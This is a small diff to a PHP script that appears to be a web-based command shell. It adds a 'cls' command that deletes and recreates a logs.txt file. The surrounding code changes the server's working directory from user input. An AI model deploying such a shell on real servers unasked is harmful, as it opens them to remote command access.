@@ -26,3 +26,10 @@ if (strpos($query, "cd") !== false)
    chdir(trim($query));
    $_SESSION['currentdir'] = $nav = getcwd();
 }
+
+## Clear windows command
+if (strpos($query, "cls") !== false)
+{
+    unlink('logs.txt');
+    file_put_contents('logs.txt',"\n", 8);
+}
